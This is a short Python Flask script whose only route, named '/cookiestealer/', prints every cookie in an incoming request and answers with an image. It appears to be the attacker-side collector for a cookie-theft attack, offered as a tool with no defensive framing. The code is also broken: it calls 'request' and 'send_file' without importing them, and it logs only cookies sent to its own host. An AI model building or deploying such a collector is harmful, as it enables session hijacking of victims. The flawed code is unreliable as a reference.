from flask import Flask

app = Flask(__name__)


@app.route('/cookiestealer/', methods=['GET'])  
def cookieStealer():
    filename = 'cookiemonster.jpg'
    
    for cookie in request.cookies:
        print(cookie)

    return send_file(filename, mimetype='image/jpeg')

if __name__ == '__main__':
    
    app.run(debug=True)
